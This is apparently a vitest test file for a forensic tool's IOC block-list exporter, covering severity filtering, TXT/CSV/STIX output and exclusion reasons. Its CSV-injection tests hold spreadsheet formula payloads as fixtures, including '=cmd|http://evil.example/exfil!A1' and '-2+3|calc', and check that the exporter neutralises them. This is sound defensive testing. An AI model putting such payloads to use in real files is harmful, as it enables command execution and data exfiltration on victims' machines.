import { describe, it, expect } from "vitest";
import {
  filterBlocklistIocs,
  buildIocBlocklistTxt,
  buildIocBlocklistCsv,
  buildIocBlocklistStix,
  buildIocBlocklist,
  blocklistExclusionReason,
  summarizeBlocklist,
  IOC_BLOCKLIST_FILE_FORMATS,
} from "../../src/reports/iocBlocklist.js";
import { retiredIocIds } from "../../src/analysis/intelRetirement.js";
import { emptyState, type IOC, type IocEnrichment } from "../../src/analysis/stateTypes.js";

function ioc(overrides: Partial<IOC>): IOC {
  return { id: "i1", type: "ip", value: "1.2.3.4", firstSeen: "2026-06-13T09:00:00Z", ...overrides };
}

function enrich(verdict: IocEnrichment["verdict"], source = "VT", score?: string): IocEnrichment {
  // A tracked, live assertion (#1024): the block-list acts only on actionable ones.
  return { source, verdict, ...(score ? { score } : {}), fetchedAt: "2026-06-13T09:00:00Z", status: "live" };
}

// ── filterBlocklistIocs ───────────────────────────────────────────────────────

describe("filterBlocklistIocs", () => {
  it("includes ip, domain, url, hash by default; excludes file and process", () => {
    const iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "domain", value: "evil.com", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i3", type: "url", value: "http://evil.com/x", enrichments: [enrich("malicious")] }),
      ioc({ id: "i4", type: "hash", value: "a".repeat(64), enrichments: [enrich("malicious")] }),
      ioc({ id: "i5", type: "file", value: "bad.exe", enrichments: [enrich("malicious")] }),
      ioc({ id: "i6", type: "process", value: "cmd.exe", enrichments: [enrich("malicious")] }),
    ];
    const result = filterBlocklistIocs(iocs, {});
    expect(result.map((r) => r.ioc.id).sort()).toEqual(["i1", "i2", "i3", "i4"]);
  });

  it("excludes IOCs below minSeverity (no enrichment → Info)", () => {
    const iocs = [
      ioc({ id: "i1", type: "ip", value: "10.0.0.1", enrichments: [enrich("malicious")] }), // High
      ioc({ id: "i2", type: "ip", value: "10.0.0.2", enrichments: [enrich("suspicious")] }), // Medium
      ioc({ id: "i3", type: "ip", value: "10.0.0.3" }), // Info (no enrichment)
    ];
    const med = filterBlocklistIocs(iocs, { minSeverity: "Medium" });
    expect(med.map((r) => r.ioc.id).sort()).toEqual(["i1", "i2"]);

    const high = filterBlocklistIocs(iocs, { minSeverity: "High" });
    expect(high.map((r) => r.ioc.id)).toEqual(["i1"]);

    const info = filterBlocklistIocs(iocs, { minSeverity: "Info" });
    expect(info.map((r) => r.ioc.id).sort()).toEqual(["i1", "i2", "i3"]);
  });

  it("harmless verdict maps to Low severity", () => {
    const iocs = [
      ioc({ id: "i1", type: "domain", value: "cdn.safe.com", enrichments: [enrich("harmless")] }),
    ];
    expect(filterBlocklistIocs(iocs, { minSeverity: "Low" })).toHaveLength(1);
    expect(filterBlocklistIocs(iocs, { minSeverity: "Medium" })).toHaveLength(0);
  });

  it("verdictOnly excludes IOCs without malicious/suspicious verdict", () => {
    const iocs = [
      ioc({ id: "i1", type: "domain", value: "evil.com", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "domain", value: "maybe.com", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i3", type: "domain", value: "unknown.com", enrichments: [enrich("unknown")] }),
      ioc({ id: "i4", type: "domain", value: "plain.com" }),
    ];
    const result = filterBlocklistIocs(iocs, { minSeverity: "Info", verdictOnly: true });
    expect(result.map((r) => r.ioc.id).sort()).toEqual(["i1", "i2"]);
  });

  it("respects type selector — only the requested types are included", () => {
    const iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "domain", value: "evil.com", enrichments: [enrich("malicious")] }),
      ioc({ id: "i3", type: "hash", value: "a".repeat(64), enrichments: [enrich("malicious")] }),
    ];
    const result = filterBlocklistIocs(iocs, { types: ["ip", "hash"] });
    expect(result.map((r) => r.ioc.id).sort()).toEqual(["i1", "i3"]);
  });

  it("treats `other` IOC as email when the value matches an email address", () => {
    const iocs = [
      ioc({ id: "i1", type: "other", value: "attacker@evil.com", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "other", value: "not-an-email-thing", enrichments: [enrich("malicious")] }),
    ];
    const result = filterBlocklistIocs(iocs, { minSeverity: "Low", types: ["email"] });
    expect(result).toHaveLength(1);
    expect(result[0].ioc.id).toBe("i1");
    expect(result[0].effectiveType).toBe("email");
  });

  it("worst verdict wins when multiple enrichments exist", () => {
    const iocs = [
      ioc({
        id: "i1",
        type: "ip",
        value: "1.2.3.4",
        enrichments: [enrich("harmless"), enrich("malicious", "TF")],
      }),
    ];
    // harmless alone → Low, but malicious also present → High
    expect(filterBlocklistIocs(iocs, { minSeverity: "High" })).toHaveLength(1);
  });
});

// ── buildIocBlocklistTxt ─────────────────────────────────────────────────────

describe("buildIocBlocklistTxt", () => {
  it("produces the standard header with case name and timestamp", () => {
    const state = emptyState("c1");
    const txt = buildIocBlocklistTxt(state, {
      caseName: "Ransomware 2026",
      generatedAt: "2026-06-13T10:00:00Z",
    });
    expect(txt).toContain("# DFIR Companion — IOC Block List");
    expect(txt).toContain("# Case: Ransomware 2026");
    expect(txt).toContain("# Generated: 2026-06-13T10:00:00Z");
  });

  it("falls back to caseId in the header when caseName is absent", () => {
    const state = emptyState("case-99");
    const txt = buildIocBlocklistTxt(state, { generatedAt: "2026-06-13T10:00:00Z" });
    expect(txt).toContain("# Case: case-99");
  });

  it("groups IOCs by type with section headers and counts", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "185.220.101.5", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "ip", value: "10.0.0.99", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i3", type: "domain", value: "evil.com", enrichments: [enrich("suspicious")] }),
    ];
    const txt = buildIocBlocklistTxt(state, { generatedAt: "t" });
    expect(txt).toContain("# IP Addresses (2)");
    expect(txt).toContain("185.220.101.5");
    expect(txt).toContain("10.0.0.99");
    expect(txt).toContain("# Domains (1)");
    expect(txt).toContain("evil.com");
  });

  it("omits empty type sections", () => {
    const state = emptyState("c1");
    state.iocs = [ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] })];
    const txt = buildIocBlocklistTxt(state, { generatedAt: "t" });
    expect(txt).toContain("# IP Addresses");
    expect(txt).not.toContain("# Domains");
    expect(txt).not.toContain("# Hashes");
  });

  it("shows verdict-confirmed note in header when verdictOnly is set", () => {
    const state = emptyState("c1");
    const txt = buildIocBlocklistTxt(state, { verdictOnly: true, generatedAt: "t" });
    expect(txt).toContain("verdict-confirmed only");
  });

  it("returns only the header block when no IOCs pass the filter", () => {
    const state = emptyState("c1");
    const txt = buildIocBlocklistTxt(state, { generatedAt: "t" });
    expect(txt).toContain("# DFIR Companion — IOC Block List");
    expect(txt).not.toContain("# IP Addresses");
  });
});

// ── buildIocBlocklistCsv ─────────────────────────────────────────────────────

describe("buildIocBlocklistCsv", () => {
  it("outputs a header row followed by one row per matching IOC", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious", "VT", "52/73")] }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    const rows = csv.trim().split("\n");
    expect(rows[0]).toBe("type,value,severity,verdict,description");
    expect(rows[1]).toContain("ip");
    expect(rows[1]).toContain("1.2.3.4");
    expect(rows[1]).toContain("High");
    expect(rows[1]).toContain("malicious");
  });

  it("includes the enrichment summary in the description column", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious", "VT", "10/72")] }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    expect(csv).toContain("VT (10/72)");
  });

  it("CSV-escapes cells that contain commas", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({
        id: "i1",
        type: "ip",
        value: "1.2.3.4",
        enrichments: [enrich("malicious", "VirusTotal"), enrich("malicious", "ThreatFox")],
      }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    // Description "malicious — VirusTotal, ThreatFox" contains a comma → must be quoted.
    expect(csv).toContain('"malicious — VirusTotal, ThreatFox"');
  });

  it("CSV-escapes values that contain commas", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "url", value: "http://evil.com/a,b", enrichments: [enrich("suspicious")] }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    expect(csv).toContain('"http://evil.com/a,b"');
  });

  it("CSV-escapes double quotes inside cells", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "url", value: 'http://evil.com/"quoted"', enrichments: [enrich("malicious")] }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    expect(csv).toContain('"http://evil.com/""quoted"""');
  });

  it("returns only the header row when no IOCs match", () => {
    const state = emptyState("c1");
    const csv = buildIocBlocklistCsv(state);
    expect(csv.trim()).toBe("type,value,severity,verdict,description");
  });

  it("guards CSV injection: a value starting with = is prefixed with a single quote", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({
        id: "i1",
        type: "url",
        value: "=cmd|http://evil.example/exfil!A1",
        enrichments: [enrich("malicious")],
      }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    // The leading = must be neutralized so Excel/LibreOffice don't run it as a formula.
    expect(csv).toContain("'=cmd|http://evil.example/exfil!A1");
    expect(csv).not.toMatch(/,=cmd\|/); // never a bare = after a comma
  });

  it("guards CSV injection: values starting with + - @ are also neutralized", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "domain", value: "+1+1|cmd", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i2", type: "domain", value: "@SUM(A1)", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i3", type: "domain", value: "-2+3|calc", enrichments: [enrich("suspicious")] }),
    ];
    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
    expect(csv).toContain("'+1+1|cmd");
    expect(csv).toContain("'@SUM(A1)");
    expect(csv).toContain("'-2+3|calc");
  });
});

// ── buildIocBlocklistStix ────────────────────────────────────────────────────

describe("buildIocBlocklistStix", () => {
  it("produces a bundle with only indicator objects", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "domain", value: "evil.com", enrichments: [enrich("suspicious")] }),
    ];
    const bundle = buildIocBlocklistStix(state, { minSeverity: "Low" });
    expect(bundle.type).toBe("bundle");
    expect(bundle.objects.every((o) => o.type === "indicator")).toBe(true);
    expect(bundle.objects).toHaveLength(2);
  });

  it("excludes IOCs below minSeverity (default Medium)", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "ip", value: "10.0.0.1" }), // no enrichment → Info → excluded
    ];
    const bundle = buildIocBlocklistStix(state);
    expect(bundle.objects).toHaveLength(1);
    expect(bundle.objects[0].name).toBe("1.2.3.4");
  });

  it("produces a valid STIX 2.1 spec_version on every object", () => {
    const state = emptyState("c1");
    state.iocs = [ioc({ id: "i1", type: "ip", value: "5.5.5.5", enrichments: [enrich("malicious")] })];
    const bundle = buildIocBlocklistStix(state, { minSeverity: "Low" });
    for (const o of bundle.objects) expect(o.spec_version).toBe("2.1");
  });

  it("produces deterministic ids matching the full STIX bundle (same namespace + key)", () => {
    const state = emptyState("c1");
    state.iocs = [ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] })];
    const a = buildIocBlocklistStix(state, { minSeverity: "Low" });
    const b = buildIocBlocklistStix(state, { minSeverity: "Low" });
    expect(a.objects[0].id).toBe(b.objects[0].id);
    // bundle id differs from full-STIX bundle (uses "|ioc-blocklist" key)
    expect(a.id).not.toBe(b.objects[0].id);
    expect(a.id).toBe(b.id);
  });

  it("returns an empty bundle when no IOCs match", () => {
    const bundle = buildIocBlocklistStix(emptyState("c1"));
    expect(bundle.type).toBe("bundle");
    expect(bundle.objects).toHaveLength(0);
  });

  it("sets indicator_types from the worst verdict", () => {
    const state = emptyState("c1");
    state.iocs = [
      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
      ioc({ id: "i2", type: "domain", value: "evil.com", enrichments: [enrich("suspicious")] }),
      ioc({ id: "i3", type: "ip", value: "2.3.4.5" }),
    ];
    const bundle = buildIocBlocklistStix(state, { minSeverity: "Info" });
    const byName = Object.fromEntries(bundle.objects.map((o) => [String(o.name), o]));
    expect(byName["1.2.3.4"].indicator_types as string[]).toContain("malicious-activity");
    expect(byName["evil.com"].indicator_types as string[]).toContain("anomalous-activity");
    expect(byName["2.3.4.5"].indicator_types as string[]).toContain("unknown");
  });
});

describe("#1266 -- a client-reported value never reaches an acting block-list", () => {
  it("is excluded even with a malicious verdict, and the header says so", () => {
    const iocs = [
      ioc({
        id: "i1",
        type: "ip",
        value: "198.51.100.23",
        provenance: "client-reported",
        enrichments: [enrich("malicious")],
      }),
      ioc({ id: "i2", type: "ip", value: "1.2.3.4", enrichments: [enrich("malicious")] }),
    ];
    const kept = filterBlocklistIocs(iocs, { minSeverity: "Info" }).map((r) => r.ioc.id);
    expect(kept).toEqual(["i2"]);
    const txt = buildIocBlocklistTxt({ ...emptyState("c1"), iocs }, { minSeverity: "Info" });
    expect(txt).toContain("client-reported excluded");
    expect(txt).not.toContain("198.51.100.23");
  });
});

// ── #1807: say why nothing matched ────────────────────────────────────────────

describe("#1807 -- block-list exclusion reasons", () => {
  // One IOC per reason, plus two that match. Documentation IPs and example domains only.
  function mixed(): IOC[] {
    return [
      ioc({ id: "m1", type: "ip", value: "203.0.113.10", enrichments: [enrich("malicious")] }),
      ioc({ id: "m2", type: "domain", value: "bad.example.com", enrichments: [enrich("suspicious")] }),
      ioc({ id: "r1", type: "ip", value: "203.0.113.11", enrichments: [enrich("malicious")] }),
      ioc({
        id: "c1",
        type: "ip",
        value: "198.51.100.23",
        provenance: "client-reported",
        enrichments: [enrich("malicious")],
      }),
      ioc({ id: "t1", type: "file", value: "C:\\Temp\\x.exe", enrichments: [enrich("malicious")] }),
      ioc({ id: "t2", type: "other", value: "user@example.com", enrichments: [enrich("malicious")] }),
      ioc({ id: "n1", type: "ip", value: "192.0.2.5" }),
      ioc({
        id: "n2",
        type: "ip",
        value: "192.0.2.6",
        enrichments: [{ ...enrich("malicious"), status: "revoked" }],
      }),
      ioc({ id: "b1", type: "domain", value: "cdn.example.com", enrichments: [enrich("harmless")] }),
      ioc({ id: "b2", type: "domain", value: "maybe.example.com", enrichments: [enrich("unknown")] }),
    ];
  }
  const retired = new Set(["r1"]);

  it("names one reason per excluded IOC, in the filter's own order", () => {
    const opts = { excludeIocIds: retired };
    const reasons = Object.fromEntries(mixed().map((i) => [i.id, blocklistExclusionReason(i, opts)]));
    expect(reasons).toEqual({
      m1: null,
      m2: null,
      r1: "retired",
      c1: "client-reported",
      t1: "ineligible-type",
      t2: "ineligible-type",
      n1: "no-actionable-intel",
      n2: "no-actionable-intel",
      b1: "below-min-severity",
      b2: "below-min-severity",
    });
    // A retired client-reported IOC reports the FIRST check it fails.
    const both = ioc({ id: "r1", provenance: "client-reported" });
    expect(blocklistExclusionReason(both, opts)).toBe("retired");
  });

  it("reports not-verdict-confirmed only after the severity floor passes", () => {
    const opts = { minSeverity: "Info" as const, verdictOnly: true };
    expect(blocklistExclusionReason(ioc({ id: "x" }), opts)).toBe("not-verdict-confirmed");
    expect(blocklistExclusionReason(ioc({ id: "x", enrichments: [enrich("harmless")] }), opts)).toBe(
      "not-verdict-confirmed",
    );
    expect(blocklistExclusionReason(ioc({ id: "x", enrichments: [enrich("malicious")] }), opts)).toBeNull();
  });

  it("keeps filterBlocklistIocs's result identical to 'no exclusion reason'", () => {
    const optionSets = [
      {},
      { minSeverity: "Info" as const },
      { minSeverity: "High" as const, types: ["ip" as const, "email" as const] },
      { minSeverity: "Low" as const, verdictOnly: true },
      { excludeIocIds: retired, types: ["domain" as const] },
    ];
    for (const opts of optionSets) {
      const kept = filterBlocklistIocs(mixed(), opts).map((r) => r.ioc.id);
      const expected = mixed()
        .filter((i) => blocklistExclusionReason(i, opts) === null)
        .map((i) => i.id);
      expect(kept).toEqual(expected);
    }
  });

  it("summarizes the counts per reason", () => {
    expect(summarizeBlocklist(mixed(), { excludeIocIds: retired })).toEqual({
      total: 10,
      matched: 2,
      excluded: {
        retired: 1,
        "client-reported": 1,
        "ineligible-type": 2,
        "no-actionable-intel": 2,
        "below-min-severity": 2,
        "not-verdict-confirmed": 0,
      },
    });
  });

  it("explains a zero-match TXT export in its header", () => {
    const state = { ...emptyState("c1"), iocs: [ioc({ id: "n1", value: "192.0.2.5" })] };
    const txt = buildIocBlocklistTxt(state, { generatedAt: "t" });
    const lines = txt.split("\n");
    const filters = lines.findIndex((l) => l.startsWith("# Filters:"));
    expect(lines[filters + 1]).toBe("# Matched 0 of 1 IOCs");
    expect(lines[filters + 2]).toBe(
      "#   1 no usable threat-intel verdict (never enriched, or the verdict expired or was revoked) — run enrichment and export again",
    );
    expect(lines[filters + 3]).toBe("");
  });

  it("lists only the non-zero reasons on a partial match, and counts retired IOCs", () => {
    const state = { ...emptyState("c1"), iocs: mixed() };
    const txt = buildIocBlocklistTxt(state, { generatedAt: "t", excludeIocIds: retired });
    expect(txt).toContain("# Matched 2 of 10 IOCs\n");
    expect(txt).toContain("#   1 retired\n");
    expect(txt).toContain("#   1 client-reported (sender-controlled header)\n");
    expect(txt).toContain("#   2 IOC type not in the block-list or not selected\n");
    expect(txt).toContain("#   2 below minimum severity Medium\n");
    expect(txt).not.toContain("not verdict-confirmed");
    expect(txt).toContain("203.0.113.10");
  });

  it("counts a retire decision recorded in the state (withRetired)", () => {
    const state = { ...emptyState("c1"), iocs: mixed() };
    const summary = buildIocBlocklist("summary", state, {});
    expect(summary).toEqual(summarizeBlocklist(state.iocs, { excludeIocIds: retiredIocIds(state) }));
  });

  it("dispatches every file format to the same builder output, CSV and STIX unchanged", () => {
    const state = { ...emptyState("c1"), iocs: mixed() };
    const opts = { generatedAt: "t" };
    expect(buildIocBlocklist("txt", state, opts)).toBe(buildIocBlocklistTxt(state, opts));
    expect(buildIocBlocklist("csv", state, opts)).toBe(buildIocBlocklistCsv(state, opts));
    expect(buildIocBlocklist("stix", state, opts)).toEqual(buildIocBlocklistStix(state, opts));
    const csv = buildIocBlocklistCsv(state, opts);
    expect(csv).not.toContain("Matched");
    expect(csv.split("\n")[0]).toBe("type,value,severity,verdict,description");
    expect(JSON.stringify(buildIocBlocklistStix(state, opts))).not.toContain("Matched");
  });

  it("describes each downloadable format's content type and file extension", () => {
    expect(IOC_BLOCKLIST_FILE_FORMATS).toEqual({
      txt: { contentType: "text/plain; charset=utf-8", extension: "txt" },
      csv: { contentType: "text/csv; charset=utf-8", extension: "csv" },
      stix: { contentType: "application/json; charset=utf-8", extension: "stix.json" },
    });
  });
});
